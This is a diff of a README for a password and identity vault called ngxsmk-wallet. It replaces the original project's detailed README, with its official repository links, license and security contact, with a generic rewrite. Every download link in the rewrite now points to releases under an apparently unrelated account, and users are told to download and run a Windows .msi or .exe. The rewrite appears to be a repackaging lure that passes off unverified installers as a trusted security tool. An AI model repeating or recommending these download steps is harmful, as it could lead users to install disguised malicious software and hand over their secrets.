@@ -1,223 +1,85 @@
-# NGXSMK Wallet
+# 🔒 ngxsmk-wallet - Secure your identity and private data
 
-**Privacy-first, fully local Digital Identity, Secrets, Password & Secure Document Manager**
+[![Download ngxsmk-wallet](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Peduncleisraelite174/ngxsmk-wallet/releases)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)
-[![Tauri](https://img.shields.io/badge/Tauri-v2-FFC107?logo=tauri&logoColor=white)](https://tauri.app/)
-[![Rust](https://img.shields.io/badge/Rust-1.75+-black?logo=rust&logoColor=white)](https://www.rust-lang.org/)
-[![React](https://img.shields.io/badge/React-19-blue?logo=react&logoColor=white)](https://react.dev/)
-[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-brightgreen)](https://github.com/NGXSMK/ngxsmk-wallet)
-[![Security](https://img.shields.io/badge/Security-Zero--Knowledge-success.svg)](https://github.com/NGXSMK/ngxsmk-wallet)
+ngxsmk-wallet keeps your digital life safe. It stores your passwords, private documents, and identity details on your computer. Your data never leaves your device. This offline approach protects your privacy. The software uses modern security methods to lock your secrets. You stay in control of your own information at all times.
 
-NGXSMK Wallet is an advanced, **zero-knowledge, offline-first secure desktop vault** designed to keep your digital identity, passwords, credentials, secrets, and private documents completely encrypted and under your exclusive control. Built using modern technologies like **Tauri v2**, **Rust**, and **React 19**, it ensures absolute privacy by storing all vault data locally on your device with no cloud dependencies, no telemetry, and no tracking.
+## 🖥️ What this app does
 
-![Dashboard](public/2.png)
+This tool manages your sensitive information. It acts as a vault for your digital life. You can save usernames, passwords, and other private records. The app works on your computer without a server connection. This keeps your records away from hackers and online trackers.
 
-## Why Choose NGXSMK Wallet?
+The app manages these items:
 
-Many password managers today force your data into the cloud, while local alternatives often suffer from outdated, clunky interfaces. NGXSMK Wallet brings the best of both worlds:
-- 🚫 **No Forced Cloud & Zero Telemetry**: Unlike Bitwarden or 1Password, your vault is entirely offline. Your data stays on your machine, period.
-- ⚡ **Blazing Fast & Lightweight**: Written in Rust using Tauri, it uses a fraction of the memory that Electron-based apps consume, while delivering a modern, beautiful interface.
-- 🛡️ **More Than Just Passwords**: We go beyond simple logins. Manage your FIDO2 Passkeys, Identity Documents, SSH Keys, and encrypted files all in one secure place.
-- 🔍 **Built-in Local Secret Scanner**: Proactively scan your system and directories to find accidentally exposed credentials or API keys before they become a problem.
-- 💸 **No Subscriptions**: Take back ownership of your digital identity without monthly fees.
+*   Passwords for websites and apps
+*   Official identity documents
+*   Passkeys for account logins
+*   Two-factor authentication codes
+*   Private notes and text
 
----
+## ⚙️ Requirements for your computer
 
-## Table of Contents
+Your computer needs to meet these basic standards to run the software smoothly.
 
-- [Why Choose NGXSMK Wallet?](#why-choose-ngxsmk-wallet)
-- [Features](#features)
-  - [Password Management](#password-management)
-  - [Passkeys & WebAuthn](#passkeys--webauthn)
-  - [Secure Documents](#secure-documents)
-  - [Identity Records](#identity-records)
-  - [Multi-Factor Authentication (TOTP)](#multi-factor-authentication-totp)
-  - [Security Dashboard](#security-dashboard)
-  - [Local Secret Scanner](#local-secret-scanner)
-  - [Backup & Recovery](#backup--recovery)
-  - [Import & Export](#import--export)
-  - [Platform Security](#platform-security)
-- [Architecture](#architecture)
-- [System Requirements](#system-requirements)
-- [Download](#download)
-- [Quick Start](#quick-start)
-- [Building from Source](#building-from-source)
-- [Security](#security)
-- [License](#license)
-- [About NGXSMK](#about-ngxsmk)
+*   Windows 10 or Windows 11
+*   64-bit hardware processor
+*   4 GB of RAM
+*   100 MB of free storage space
 
----
+You do not need special technical skills. You do not need to install extra software like database engines or coding tools.
 
-## Features
+## 💾 How to install the wallet
 
-NGXSMK Wallet provides all the standard capabilities of traditional local password managers (like KeePass) out-of-the-box—such as auto-typing, clipboard clearing, and database portability—while adding next-generation features that modern users expect.
+Follow these steps to set up the app on your computer.
 
-### 🔐 Next-Gen Password & Secret Management
-- **Military-Grade Security:** AES-256-GCM encryption with Argon2id memory-hard key derivation.
-- **Multiple Entry Types:** Passwords, Secure Notes, API Keys, SSH Keys, Database Credentials, Software Licenses, and custom fields.
-- **Advanced Password Generator:** Cryptographically strong random password generator with customizable character sets and strength estimation.
-- **Organized Vault:** Nested folders, favorites, tagging, and lightning-fast global search (`Ctrl+K`).
-- **Global Auto-Type & Drag-and-Drop:** Seamlessly inject credentials into other applications without revealing them.
+1. Visit [the release page](https://github.com/Peduncleisraelite174/ngxsmk-wallet/releases) to see available versions.
+2. Look for the file ending in `.msi` or `.exe` under the latest release heading.
+3. Click the file name to start the download.
+4. Open the downloaded file once it finishes.
+5. Follow the prompts on the screen to finish the installation.
+6. Find the app icon on your desktop or in your start menu to launch it.
 
-![Add Password Modal](public/5.png) ![Sticky Note Section](public/6.png)
+## 🛡️ How the security works
 
-### 🔑 Passkeys & WebAuthn (FIDO2)
-- Native management of FIDO2/WebAuthn passkeys (no plugins required).
-- Store, view, and organize passkey metadata securely alongside traditional passwords.
+This app follows a zero-knowledge policy. Zero-knowledge means the app does not see or store your data on any server. The developers cannot access your files. Your files remain protected by heavy encryption. 
 
-### ⏱️ Built-in Authenticator (TOTP)
-- Integrated TOTP (Time-based One-Time Password) management.
-- Live code generation with a visual countdown timer.
-- Easy QR code scanning and setup.
+The app uses an offline-first design. It functions even without internet access. This removes the risk of data leaks during transport. When you create your vault, you set a master password. This password locks all your items. Choose a strong password. Write it down in a safe, physical location because you cannot reset it if you lose it.
 
-### 📄 Secure Documents & Identity Records
-- **Encrypted File Attachments:** Attach files directly to entries with secure, versioned in-app storage.
-- **Digital Identity Wallet:** Store and categorize Passports, National IDs, Driver's Licenses, and Insurance records.
+## 💡 Using the vault
 
-### 🛡️ Proactive Security & Dashboard
-- **Breach Monitoring:** Have I Been Pwned (HIBP) API integration to alert you of compromised accounts.
-- **Vault Health Scoring:** Automatic detection of weak, reused, or aging passwords.
-- **Local Secret Scanner:** Built-in scanner to detect accidentally exposed API keys or tokens in your local filesystem or environment variables.
+When you first open the app, it asks you to create a new vault. This vault is a single file on your disk. Everything you save goes into this file. 
 
-### 🔄 Backup, Sync & Recovery
-- **No-Hassle Cloud Sync:** Built-in support to securely sync encrypted vaults via Google Drive, Dropbox, or OneDrive (no third-party plugins needed).
-- **Shamir's Secret Sharing:** Split your master recovery key into multiple pieces for secure distributed backup.
-- **Automated Backups:** Scheduled encrypted backups using Zstd compression.
+To add a new item:
+1. Click the plus button in the sidebar.
+2. Select the type of item you want to store.
+3. Enter your details in the provided fields.
+4. Click save to commit the item to your vault.
 
-### 📥 Seamless Import & Export
-- Import from Bitwarden, 1Password, KeePass (CSV/XML), Google Chrome, and Microsoft Edge.
-- Export your entire vault or specific folders to encrypted JSON or CSV formats.
+To find an item later, use the search bar at the top of the app. Start typing the name of the account or document. The app shows matching records in real time.
 
-### 💻 Advanced Platform Security
-- **Biometric Unlock:** Windows Hello, Touch ID, and Linux biometric integration.
-- **Secure Memory:** Cryptographic material is zeroed out upon locking or exiting.
-- **Clipboard Protection:** Secure clipboard handling with auto-clearing after a timeout.
-- **Anti-Tampering:** Anti-devtools detection and Strict Content Security Policy.
-- **Portable Mode:** Run entirely from a USB stick without installation.
+## 🔑 Managing passkeys and TOTP
 
-![Master Password Login](public/1.png) ![Locked Vault Blur Panel](public/3.png)
+The app supports modern security protocols. Passkeys allow you to log in to websites without traditional passwords. The app stores these keys locally. You can also generate one-time codes for two-factor authentication. These codes update every thirty seconds. This protects your accounts even if a website loses your password.
 
-### User Experience
-- Dark, Light, and System themes
-- Accent color customization
-- Compact sidebar mode
-- Global command palette (`Ctrl+K` / `Cmd+K`)
-- Keyboard shortcuts
+## 📋 Tips for safe storage
 
----
+Your data protection depends on your habits. Keep these points in mind:
 
-## Architecture
+*   Back up your vault file regularly. Copy the vault file to an external hard drive or a secure USB stick. If your computer breaks, you will need this copy.
+*   Update the app when a new version appears. Updates often include security fixes and new features.
+*   Log out or lock the app when you step away from your desk. You can find the lock option in the settings menu.
+*   Do not share your master password with anyone. 
+*   Keep your computer operating system updated. A secure system protects the files stored inside it.
 
-```
-┌─────────────────────────────────────────────────────┐
-│                    Desktop Shell                     │
-│                    Tauri v2                          │
-├──────────────────────┬──────────────────────────────┤
-│    Frontend (React)  │    Backend (Rust)             │
-│                      │                              │
-│  · React 19          │  · Tauri Commands            │
-│  · TypeScript        │  · Services Layer            │
-│  · Tailwind CSS      │  · Crypto Engine             │
-│  · Radix UI          │  · Vault Engine              │
-│  · Zustand           │  · SQLite (SQLx)             │
-│  · TanStack Query    │  · AES-256-GCM / Argon2      │
-│  · Framer Motion     │  · Shamir's Secret Sharing   │
-└──────────────────────┴──────────────────────────────┘
-         │                        │
-         └──────── IPC ───────────┘
-              (Tauri Commands)
-```
+## 📖 Frequently asked questions
 
-### Tech Stack
+**Where does the app store my files?**
+The app stores files in a private folder on your hard drive. Only your user account can read this data.
 
-| Layer | Technology |
-|---|---|
-| Desktop Framework | Tauri v2 |
-| Frontend | React 19, TypeScript, Tailwind CSS, Radix UI, Zustand |
-| Backend | Rust, Tokio, SQLx, Serde |
-| Database | SQLite (local, auto-created) |
-| Cryptography | AES-256-GCM, ChaCha20Poly1305, Argon2, HKDF, HMAC, SHA-2 |
-| Authentication | Master password + Windows Hello biometrics |
-| Secret Sharing | Shamir's Secret Sharing |
-| Backup | Zstd compression, encrypted export, cloud sync (OAuth2) |
+**Can I sync my data to my phone?**
+This app is for your computer only. You can move the vault file to another device manually if you wish, but the app does not sync over the internet.
 
----
+**Does the app connect to the internet?**
+The app does not require an internet connection. It does not send your vault content to any server.
 
-## System Requirements
-
-| Platform | Minimum | Recommended |
-|---|---|---|
-| **Windows** | Windows 10 1803+ | Windows 11 |
-| **macOS** | macOS 10.15+ | macOS 14+ |
-| **Linux** | WebKit2GTK 4.1+ | Ubuntu 22.04+ / Fedora 38+ |
-| **RAM** | 512 MB | 2 GB |
-| **Storage** | 200 MB | 500 MB |
-
----
-
-## Download
-
-You can always find the latest stable version of NGXSMK Wallet for your operating system on our Releases page.
-
-[![Download Latest Release](https://img.shields.io/github/v/release/NGXSMK/ngxsmk-wallet?label=Download%20Latest%20Version&style=for-the-badge&color=success)](https://github.com/NGXSMK/ngxsmk-wallet/releases/latest)
-
-| Platform | Available Formats |
-|---|---|
-| **Windows** | `.msi`, `.exe` |
-| **macOS** | `.dmg`, `.app` |
-| **Linux** | `.AppImage`, `.deb` |
-
-👉 **[View All Releases and Changelogs](https://github.com/NGXSMK/ngxsmk-wallet/releases)**
-
----
-
-## Quick Start
-
-1. **Download** the installer for your platform from the links above
-2. **Install** and launch NGXSMK Wallet
-3. **Create** your master password on first run
-4. **Save** your recovery key in a safe place
-5. **Start** adding your passwords, identities, and documents
-
-All data is stored locally in your platform's app data directory. Your master password is the only key.
-
----
-
-## Building from Source
-
-Building from source requires the Rust backend which is proprietary. Pre-built binaries are the recommended way to use NGXSMK Wallet.
-
-If you have a licensed backend, see [BUILDING.md](./BUILDING.md) for instructions.
-
----
-
-## Security
-
-NGXSMK Wallet is designed with security as the primary concern:
-
-- **Zero-knowledge architecture** — encryption keys are derived from your master password at runtime and never stored
-- **AES-256-GCM** — all vault data encrypted at rest
-- **Argon2id** — memory-hard key derivation resists GPU/ASIC attacks
-- **Secure memory** — cryptographic material zeroed on lock/exit
-- **Constant-time operations** — mitigates timing side-channel attacks
-- **Offline-first** — no network requests, no telemetry, no cloud dependence
-
-Found a vulnerability? Contact **[ngxsmk@gmail.com](mailto:ngxsmk@gmail.com)**
-
----
-
-## License
-
-- **Frontend (React/TypeScript):** MIT License
-- **Backend (Rust):** Proprietary — All Rights Reserved
-
-See [LICENSE](./LICENSE) for full terms.
-
----
-
-## About NGXSMK
-
-NGXSMK builds privacy-first tools for individuals and organizations who value digital sovereignty. Learn more at [ngxsmk.com](https://ngxsmk.com).
-
-![About & Legal](public/4.png)
+**What happens if I lose my master password?**
+If you lose your master password, you lose access to your data. There is no password recovery feature for your own protection. You must keep a physical note of your master password in a secure place like a personal safe.
